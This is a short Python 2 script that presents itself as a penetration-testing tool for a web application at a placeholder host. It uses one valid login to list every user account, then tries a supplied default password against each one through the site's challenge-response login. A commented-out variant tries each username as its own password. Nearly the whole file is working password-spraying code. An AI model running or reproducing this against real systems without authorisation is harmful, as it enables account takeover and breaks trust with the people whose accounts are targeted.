# Description
# Gets all the in use account names and check if there are some test accounts by checking for a default password

# Parameters
# Parameter 1: Username of the account to use to get all the account names
# Parameter 2: Password of the account to use to get all the account names
# Parameter 3: Password to try on the accounts. (Default login password of the company you pentest, to check whether there is an password policy in place or not)

# Additional
# Replace [Host] with the host
# Replace [Post_Value] with the post to retrieve all the users

import sys
import requests
import hashlib
import json
from collections import namedtuple
from os import system
import re
from multiprocessing.dummy import Pool

def login(loginID, password, getCookie = False):
    #get challenge
    try:
        r = requests.get('https://[Host]/Services/Security.asmx/InitializeLogin?loginid=%s' % loginID)
    except:
        return login(loginID, password, getCookie)
    
    s = r.content
    s = s[s.index('{'):s.index('}') + 1]
    x = json.loads(s, object_hook=lambda d: namedtuple('X', d.keys())(*d.values()))
    
    #hash password with challenge
    hash_dig = password
    try:
        for i in range(0, x.iterations):
            hash_dig = hashlib.sha256(hash_dig + x.salt + password).hexdigest()
        hash_dig = hashlib.sha256(hash_dig + x.challenge).hexdigest()
    except:
        print "[!] Error on loginID",loginID
        return False

    try:
        login = requests.get('https://[Host]/Services/Security.asmx/Login?response=%s' % hash_dig, cookies=r.cookies)
    except:
        return login(loginID, password, getCookie)

    if getCookie:
        return r.cookies
    return "true" in login.content

def progress(count, total, suffix = ''):
    bar_len = 20
    filled_len = int(round(bar_len * count / float(total)))
    
    percents = round(100.0 * count / float(total), 1)
    bar = '=' * filled_len + '-' * (bar_len - filled_len)
    
    sys.stdout.write('[%s] %s%% [%s]\r' % (bar, percents, suffix))
    sys.stdout.flush()


loginID = sys.argv[1]
password = sys.argv[2]
passTry = sys.argv[3]
found = 0

cookies = login(loginID, password, True)
post = '[Post_Value]'
users = requests.post('https://[Host]/Services/UserGroupPicker.asmx', post, cookies=cookies, headers={"content-type":"text/xml"})
accounts = re.findall(r'<LOGINID>([^<]*?)</LOGINID><USERNAME>([^<]*?)</USERNAME>', users.content)
print "[*]", len(accounts), "accounts found"

i = 1
for account in accounts:
    i = i + 1
    if login(account[0], passTry):
        print '[+] {0} with password {1} for user {2}'.format(account[0], passTry, account[1])
        found = found + 1
        
    #elif login(account[0], account[0]):
    #    print '[+] {0} with password {1} for user {2}'.format(account[0], account[0], account[1])
    #    found = found + 1
    progress(i, len(accounts), found)
